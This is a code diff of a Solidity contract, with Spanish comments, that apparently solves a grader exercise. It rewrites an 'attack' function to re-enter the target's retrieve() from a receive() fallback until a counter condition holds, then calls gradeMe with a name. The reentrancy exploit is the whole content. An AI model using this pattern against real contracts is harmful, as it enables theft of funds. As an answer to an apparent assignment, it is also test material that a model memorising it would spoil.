@@ -9,29 +9,36 @@ interface IGrader5 {
 
 contract Jaquer {
     IGrader5 public grader;
+    string public targetName;
+    uint256 public retrieveCount;
     
     constructor(address graderAddress) payable {
         grader = IGrader5(graderAddress);
     }
     
     function attack(string calldata name) external payable {
-        // Primero llamamos a retrieve() 2 veces para establecer counter > 1
-        // Necesitamos enviar más de 3 wei cada vez (pero solo 1 wei es devuelto)
-        for (uint i = 0; i < 2; i++) {
-            grader.retrieve{value: 4}();
-        }
-        
-        // Verificamos que counter > 1
-        require(grader.counter(address(this)) > 1, "Counter not set correctly");
-        
-        // Llamamos a gradeMe con el nombre proporcionado
-        grader.gradeMe(name);
+        require(msg.value >= 12, "Need at least 12 wei");
+        targetName = name;
+        retrieveCount = 0;
+        // Iniciamos el proceso llamando a retrieve por primera vez
+        grader.retrieve{value: 4}();
     }
     
-    // Función para recibir ETH (necesario para las devoluciones de retrieve)
-    receive() external payable {}
+    receive() external payable {
+        retrieveCount++;
+        
+        // Verificamos si ya cumplimos con counter > 1
+        if (grader.counter(address(this)) > 1) {
+            // Si ya tenemos counter > 1, llamamos a gradeMe
+            grader.gradeMe(targetName);
+        } else {
+            // Si no, seguimos llamando a retrieve
+            if (retrieveCount < 3) { // Prevención contra loops infinitos
+                grader.retrieve{value: 4}();
+            }
+        }
+    }
     
-    // Función para retirar fondos del contrato
     function withdraw() external {
         payable(msg.sender).transfer(address(this).balance);
     }
